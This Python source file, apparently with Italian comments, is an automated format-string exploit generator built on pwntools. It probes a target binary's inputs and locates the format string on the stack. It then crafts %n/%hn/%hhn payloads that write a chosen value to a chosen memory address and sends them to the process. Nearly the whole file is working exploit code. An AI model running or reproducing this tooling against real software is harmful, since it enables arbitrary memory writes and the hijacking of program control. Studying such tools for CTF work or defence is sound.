import struct

import FormatStringGenerator
import Logger
from pwn import *


def format_pack(write_dimension, order_byte):
    if write_dimension == 8:
        architecture_char = "Q"
    elif write_dimension == 4:
        architecture_char = "L"
    elif write_dimension == 2:
        architecture_char = "H"
    elif write_dimension == 1:
        architecture_char = "B"

    if order_byte == "little":
        byte_char = "<"
    elif order_byte == "big":
        byte_char = ">"
    else:
        byte_char = ""

    return byte_char + architecture_char


def get_write_size(write_dimension, value, order_byte):
    byte_sizes = [8, 4, 2, 1]
    current_byte_sizes = [write_dimension]

    while True:
        j = 0
        bytes_list = []
        for byte_size in current_byte_sizes:
            bytes_list.append(value[j:j + byte_size])
            j += byte_size

        total_padding = 0

        values_list = []
        for hex_bytes in bytes_list:
            new_value = int.from_bytes(hex_bytes, byteorder=order_byte)
            values_list.append(new_value)
            total_padding += new_value

        if total_padding < 4000:
            print(*current_byte_sizes, sep=';')
            return current_byte_sizes, bytes_list
        else:
            max_index = values_list.index(max(values_list))
            current_byte_size = current_byte_sizes[max_index]

            byte_size_index = byte_sizes.index(current_byte_size)
            new_byte_size = byte_sizes[byte_size_index + 1]
            current_byte_sizes[max_index] = new_byte_size
            current_byte_sizes.insert(max_index, new_byte_size)


def define_markers(response):
    markers_count = [0, 0, 0]
    for i in range(2, 50):
        for j in range(200):
            test_markers = [''.join(random.choice("ghijklmnopqrstuvwxyz") for h in range(i)),
                            ''.join(random.choice("ghijklmnopqrstuvwxyz") for h in range(i))]

            print(test_markers)
            if markers_count[0] == response.count(test_markers[0]) and markers_count[1] == response.count(
                    test_markers[1]):
                if markers_count[2] + 1 == 10:
                    return test_markers
                markers_count[2] += 1
            else:
                markers_count[0] = response.count(test_markers[0])
                markers_count[1] = response.count(test_markers[1])
            j += 1
        i += 1

    return None


def get_wrapped_string(response, markers):
    try:
        found = re.findall(markers[0] + '(.+?)' + markers[1], response)
        print("found = " + str(found))
        return found
    except AttributeError:
        print("Errore nell'estrazione della risposta")


def get_addresses(response, markers):
    found = get_wrapped_string(response, markers)[0]
    return (found.replace("(nil)", "0x0").replace("G", "")).split("0x")[1:]


class Exploit:
    def __init__(self, target, value, target_address, input_in_json, configs):
        self.start_fmt_position = None

        self.target = target
        self.target_address = target_address
        self.configs = configs

        e = ELF(target)
        self.order_byte = e.endian
        self.address_size = e.bytes
        self.write_dimension = self.configs["bytes_to_write"] if self.configs["bytes_to_write"] in [1, 2, 4,
                                                                                                    8] else self.address_size

        self.command_line_input_list = list()
        self.during_execution_input_list = list()
        for input_elem in input_in_json["input"]:
            if input_elem["value"] == "":
                input_elem["value"] = "P" * self.address_size
                input_elem["free"] = True
            else:
                input_elem["free"] = False

            if input_elem["type"] == "execution_input":
                self.during_execution_input_list.append(input_elem)
            elif input_elem["type"] == "command_line_input":
                self.command_line_input_list.append(input_elem)
        print(self.during_execution_input_list)

        self.value = struct.pack(format_pack(self.address_size, self.order_byte), value)

        self.direct_fmt_generator = FormatStringGenerator.DirectFmtGenerator()

        self.logger = Logger.Logger(self.target, self.configs)
        self.logger.write("Dimensione indirizzi: {} byte\nEndian: {}\n\nInput da linea di comando: {}\nInput da passare durante l'esecuzione: {}".format(self.address_size, self.order_byte, self.command_line_input_list,self.during_execution_input_list))

        fmt_length_without_writer_position = self.prepare_writer()
        self.test_free_input(fmt_length_without_writer_position)

    def send_payload(self, encoded=False):
        command_line_inputs = list()
        for elem in self.command_line_input_list:
            command_line_inputs.append(elem["value"])
        p = process([self.target] + command_line_inputs)
        print("Command line inputs " + str(self.command_line_input_list))

        total_response = ""
        try:
            if len(self.during_execution_input_list) > 0:
                if self.configs["wait_time"] == -1:
                    total_response += p.recvuntil(delims=self.during_execution_input_list[0]["marker"]).decode()
                else:
                    total_response += p.recvuntil(delims=self.during_execution_input_list[0]["marker"],
                                                  timeout=self.configs["wait_time"]).decode()

                for i in range(0, len(self.during_execution_input_list)):

                    elem = self.during_execution_input_list[i]
                    print(elem["value"])
                    p.sendline(str.encode(elem["value"])) if encoded is False else p.sendline(elem["value"])
                    print(p.recvline())
                    if i < len(self.during_execution_input_list) - 1:

                        if self.configs["wait_time"] == -1:
                            response = p.recvuntil(self.during_execution_input_list[i + 1]["marker"]).decode()
                        else:
                            response = p.recvuntil(self.during_execution_input_list[i + 1]["marker"],
                                                   timeout=self.configs["wait_time"]).decode()

                    else:
                        response = p.recvall().decode()

                    total_response += response

            else:
                total_response = p.recvall(timeout=self.configs["wait_time"]).decode() if self.configs[
                                                                                              "wait_time"] != -1 else p.recvall(
                    timeout=self.configs["wait_time"]).decode()
                print(total_response)
        except EOFError:
            print(total_response)
            print("EOF")
            return -11

        if p.poll() == -11:
            return -11

        return total_response

    def prepare_writer(self):
        write_size, value_padding = get_write_size(self.address_size, self.value, self.order_byte)
        print("WRITE_SIZE: ")
        print(write_size)

        target_addresses = list()
        values = list()
        addr = self.target_address
        for i in write_size:
            target_addresses.append(struct.pack(format_pack(self.address_size, self.order_byte), addr))
            addr = addr + i
            print("Target address " + hex(addr))

        for bytes in value_padding:
            # values.append(bytes)
            values.append(int.from_bytes(bytes, byteorder=self.order_byte))

        target_addresses = [address for _, address, _ in sorted(zip(values, target_addresses, write_size))]
        write_size = [w_size for _, _, w_size in sorted(zip(values, target_addresses, write_size))]
        values.sort()

        counter = 0
        writers_len = 0
        for value, address, w_size in zip(values, target_addresses, write_size):
            print(str(value) + ', ' + address.decode("latin1"))

            if w_size == 8:
                writer = "ln"
            elif w_size == 4:
                writer = "n"
            elif w_size == 2:
                writer = "hn"
            elif w_size == 1:
                writer = "hhn"

            print('counter ' + str(counter))
            # print(str(len(self.string_generator.)))
            print('value is ' + str(value))

            padding = value - counter
            counter += padding

            if 1 <= padding <= 7:
                padding = "A" * padding
            else:
                padding = "%" + str(padding) + "x"

            print("writer:")
            print(writer)
            self.direct_fmt_generator.add_writer([padding, writer])
            writers_len += len(padding) + len(writer)

        self.direct_fmt_generator.set_address(target_addresses)

        print("writer_len " + str(writers_len))
        print("addr_len " + str(len(target_addresses) * self.address_size))

        return writers_len + len(target_addresses) * self.address_size

    def test_free_input(self, fmt_length_without_writer):
        pattern = ''.join(random.choice(string.ascii_uppercase) for i in range(fmt_length_without_writer))
        confirm_pattern = ''.join(random.choice(string.ascii_lowercase) for i in range(fmt_length_without_writer))

        self.logger.write("\n\n\nInizio ricerca di input vulnerabili\n\n")

        for input_elem in (self.command_line_input_list + self.during_execution_input_list):
            self.logger.write("Input in test: {}\n".format(input_elem))

            if input_elem["free"] is False:
                self.logger.write("Input non libero\n\n")
                continue

            input_elem["value"] = pattern

            self.logger.write("Input libero, verifica se stampa la dimensione minina della fmt: ")

            response = self.send_payload()

            print(response)
            pattern_occ = response.count(pattern)
            confirm_pattern_occ = response.count(confirm_pattern)

            input_elem["value"] = confirm_pattern

            response = self.send_payload()

            if not (response.count(pattern) == pattern_occ - 1 and response.count(
                    confirm_pattern) == confirm_pattern_occ + 1):
                self.logger.write("dimensione minima non raggiungibile\n\n")
                input_elem["free"] = False
                input_elem["value"] = "PPPP"
                continue

            self.logger.write("dimensione minima stampata\nDefinizione marcati per estrarre fmt nella risposta: ")

            markers = define_markers(response)

            if markers is None:
                self.logger.write("Impossibile definire marcatori\n\n")
                input_elem["free"] = False
                input_elem["value"] = "PPPP"
                continue
            self.logger.write("{}, {}\n".format(markers[0], markers[1]))

            # Provo a capire quanti caratteri posso passare all'input (valore specifico o > 500)
            self.logger.write("Conteggio della dimansione effettiva dell'input (fino a {} caratteri): ".format(len(markers[0] + markers[1]) + 500))
            input_elem["value"] = markers[0] + "C" * (500 + fmt_length_without_writer) + markers[1]
            response = self.send_payload()
            print(markers)
            print(response)
            wrapped_fmt = get_wrapped_string(response, markers)

            if len(wrapped_fmt) > 1 or response.count(wrapped_fmt[0]) > 1:
                self.logger.write("Rilevate più stampe della variabile\n\n")
                input_elem["free"] = False
                input_elem["value"] = "PPPP"
                continue

            input_len = len(wrapped_fmt[0]) - len(
                markers[0] + markers[1])  # tolgo i caratteri riservati ai marcatori
            self.logger.write("{} caratteri disponibili\n".format(input_len))

            self.logger.write("Ricerca fmt su stack: ")
            shift_for_broken_pattern = self.find_fmt_position_on_stack(input_elem, input_len, markers)
            if shift_for_broken_pattern == -11:
                input_elem["free"] = True
                input_elem["value"] = "PPPP"
                self.direct_fmt_generator.reset_direct_parameter_num()
                self.logger.write("fmt non trovata -> segfault incontrato\n\n")
                input_elem["free"] = False
                input_elem["value"] = "PPPP"
                continue
            elif shift_for_broken_pattern == -1:
                self.logger.write("fmt non trovata -> la dimensione dell'input non è sufficiente per procedere con la ricerca\n\n")
                input_elem["free"] = False
                input_elem["value"] = "PPPP"
                continue

            self.logger.write("posizione {}\n".format(self.start_fmt_position))
            self.logger.write("Generazione fmt per exploit: ")
            if input_elem["type"] == "execution_input":
                exploit = self.define_direct_fmt(input_elem, input_len, markers)

                if exploit == -1:
                    self.logger.write("la dimensione dell'input non è sufficiente per stampare l'fmt di exploit\n\n")
                    input_elem["free"] = False
                    input_elem["value"] = "PPPP"
                    continue

                self.logger.write("generazione completata con successo\n")
                input_elem["value"] = exploit
                response = self.send_payload()

                self.logger.write("La risposta è:\n----------------------------------------\n{}\n----------------------------------------\n".format(response))
                return
            else:
                i = 0
                for writer in self.direct_fmt_generator.writers:
                    pos = "0" * (4 - len(str(self.start_fmt_position + i))) + str(self.start_fmt_position + i)
                    pos = "%" + pos + "$"
                    writer[1] = pos + writer[1]
                    i += 1

                exploit = self.direct_fmt_generator.generate_final_fmt2(shift_for_broken_pattern, len(markers[0]),input_len) + markers[1].encode()

                if exploit == -1:
                    self.logger.write("la dimensione dell'input non è sufficiente per stampare l'fmt di exploit\n\n")
                    input_elem["free"] = False
                    input_elem["value"] = "PPPP"
                    continue

                self.logger.write("generazione completata con successo\n")

                input_elem["value"] = exploit
                response = self.send_payload()

                self.logger.write("La risposta è:\n----------------------------------------\n{}\n----------------------------------------\n".format(response))
                return

        self.logger.write("Nessun input exploitabile individuato")

    def find_fmt_position_on_stack(self, input_in_testing, input_len, markers):
        print("FORMAT STRING POSITION:")

        checked_addresses = 0
        segfault_count = 0
        while True:
            pattern = "AAAAAAAA" if self.address_size == 8 else "AAAA"
            self.direct_fmt_generator.set_temp_address(pattern)

            found = False
            position = None
            shift_for_broken_pattern = 0
            while not found:
                if input_in_testing["type"] == "execution_input":
                    fmt = self.direct_fmt_generator.generate_next_fmt_for_find_start(
                        input_len) if segfault_count == 0 else self.direct_fmt_generator.generate_next_fmt_for_find_start_segfault_encountered(
                        input_len)

                    if fmt == -1:
                        return -1

                    input_in_testing["value"] = markers[0] + fmt + markers[1]

                else:
                    fmt = self.direct_fmt_generator.generate_next_fmt_for_command_line_input(input_len)

                    if fmt == -1:
                        return -1

                    input_in_testing["value"] = markers[0] + fmt + markers[1]

                response = self.send_payload()
                print("........................................")
                print(response)

                if response == -11:
                    if segfault_count == 0:
                        segfault_count += 1
                        self.direct_fmt_generator.set_direct_parameter_num(checked_addresses)
                        continue
                    else:
                        return -11

                print("risposta -> " + str(response))

                addresses = get_addresses(response, markers)
                print(addresses)

                hex_pattern = pattern.encode().hex()
                print(fmt)
                for i in range(len(addresses)):
                    print("INDIRIZZO " + str(i) + " -> " + str(addresses[i]))
                    if addresses[i] == hex_pattern:
                        position = i
                        # positio + 1 + checked = 12 -> pos att -> controllo dalla 13 -> setto 14
                        self.direct_fmt_generator.set_direct_parameter_num(
                            (position + 1 + checked_addresses) + 2)  # salto la posizione corrente position+1
                        break
                    elif i < len(addresses) - 1:
                        if addresses[i].count("00") == 0 and addresses[i + 1].count("00") == 0 and \
                                addresses[i].count(hex_pattern[0:2]) + addresses[i + 1].count(
                            hex_pattern[0:2]) == self.address_size:
                            position = i
                            shift_for_broken_pattern = addresses[i].count(hex_pattern[0:2])
                            self.direct_fmt_generator.set_direct_parameter_num((position + 1 + checked_addresses) + 2)
                            break
                        elif addresses[i].count("00") > 0 or addresses[i + 1].count("00") > 0:
                            count_curr_addr = (addresses[i].split("00"))[0].count(hex_pattern[0:2])
                            count_next_addr = (addresses[i + 1].split("00"))[1].count(hex_pattern[0:2]) if \
                                addresses[i + 1].count("00") > 0 else addresses[i + 1].count(hex_pattern[0:2])
                            if count_curr_addr + count_next_addr == self.address_size:
                                position = i
                                shift_for_broken_pattern = count_curr_addr
                                self.direct_fmt_generator.set_direct_parameter_num(
                                    (position + 1 + checked_addresses) + 2)
                                break

                print("Position: " + str(position))

                if position is not None:
                    found = True
                else:
                    print(len(addresses))
                    checked_addresses += len(addresses) - 1
                    print("cheched addresses " + str(checked_addresses))

            print("Cerco b")
            confirm_pattern = "BBBBBBBB" if self.address_size == 8 else "BBBB"
            hex_confirm_pattern = confirm_pattern.encode().hex()

            input_in_testing["value"] = input_in_testing["value"].replace("A", "B")

            response = self.send_payload()
            print(response)

            addresses = get_addresses(response, markers)

            print("Address " + str(position) + " = " + str(addresses[position]))
            print("Address " + str(position + 1) + " = " + str(addresses[position + 1]))

            print("QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ")
            if addresses[position] == hex_confirm_pattern:
                self.start_fmt_position = position + 1 + checked_addresses
                print("Posizione iniziale " + str(self.start_fmt_position + 1))

                return
            elif addresses[position].count("00") == 0 and addresses[position + 1].count("00") == 0 and \
                    addresses[position].count(hex_confirm_pattern[0:2]) + addresses[position + 1].count(
                hex_confirm_pattern[0:2]) == self.address_size:
                self.start_fmt_position = (position + 2) + checked_addresses

                return shift_for_broken_pattern
            elif addresses[position].count("00") > 0 or addresses[position + 1].count("00") > 0:
                count_curr_addr = (addresses[position].split("00"))[0].count(hex_confirm_pattern[0:2])
                count_next_addr = (addresses[position + 1].split("00"))[1].count(hex_confirm_pattern[0:2]) if \
                    addresses[position + 1].count("00") > 0 else addresses[position + 1].count(hex_confirm_pattern[0:2])

                if count_curr_addr + count_next_addr == self.address_size:
                    self.start_fmt_position = (position + 2) + checked_addresses

                    return shift_for_broken_pattern

            checked_addresses += position + 1
            print(".................................. + " + str(checked_addresses))

    def define_direct_fmt(self, input_in_testing, input_len, markers):
        writers = getattr(self.direct_fmt_generator, "writers")

        current_offset = 0
        for writer in writers:
            current_offset += len(str(writer[0]) + str(writer[1]))

        print("Current_offset " + str(current_offset))

        self.start_fmt_position -= (
                (len(markers[0]) // self.address_size) + (1 if len(markers[0]) % self.address_size != 0 else 0))
        print(self.start_fmt_position)
        # %0pos$
        total_offset = current_offset + (1 + (1 + len(str(self.start_fmt_position))) + 1) * len(writers)
        address_position_incr = total_offset // self.address_size
        not_covered_offset = total_offset % self.address_size

        print("total_offset " + str(total_offset))

        if not_covered_offset > 0:
            address_position_incr += 1
            self.direct_fmt_generator.set_align_padding("B" * (self.address_size - not_covered_offset))

        i = 0
        for writer in writers:
            pos = "0" + str(address_position_incr + self.start_fmt_position + i) if len(
                str(address_position_incr + self.start_fmt_position)) == len(str(self.start_fmt_position)) else str(
                address_position_incr + self.start_fmt_position + i)
            pos = "%" + pos + "$"
            writer[1] = pos + writer[1]
            i += 1

        self.direct_fmt_generator.set_temp_address(("C" * self.address_size))
        if len(self.direct_fmt_generator.generate_fmt_for_find_end()) > input_len:
            input_in_testing["value"] = "C" * len(self.direct_fmt_generator.generate_fmt_for_find_end())
            response = self.send_payload()
            if len(get_wrapped_string(response, markers)[0]) != len(
                    self.direct_fmt_generator.generate_fmt_for_find_end()):
                return -1

        return self.direct_fmt_generator.generate_fmt_in_byte()

        """f = open('exp', 'wb')
        f.write(self.direct_fmt_generator.generate_fmt_in_byte())
        f.close()

        response = self.send_payload(encoded=True)

        print(response)

        print(address_position_incr + self.start_fmt_position)

        print(self.direct_fmt_generator.generate_fmt_for_find_end())

        self.direct_fmt_generator.set_temp_address("A" * 8)
        input_in_testing["value"] = self.direct_fmt_generator.generate_fmt_for_find_end()
        print(self.send_payload())

        print(getattr(self.direct_fmt_generator, "address"))"""
